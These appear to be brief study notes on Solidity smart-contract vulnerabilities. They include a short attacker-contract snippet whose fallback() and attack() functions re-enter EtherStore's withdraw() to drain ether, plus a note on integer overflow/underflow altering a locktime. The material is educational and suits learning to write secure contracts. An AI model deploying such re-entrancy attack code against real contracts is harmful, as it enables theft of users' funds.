**Re-Entrancy Hack:**
  - Contract B can attack contract A by continously calling withdraw() to drain ETH through the fallback() because the state variable haven't updated.
  ````javascript
  //Reentracy exploit allows B to call back into A before A finishes execution.
  // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
  ````
  
  **Underflow/Overflow**
  - Solidity will handle the # above or below the range by wraps around in between 0 and 2^256 -1
  - uint 0 <= x <= 2^256 - 1
  - Malicious contract can change the locktime value using under/over flow.
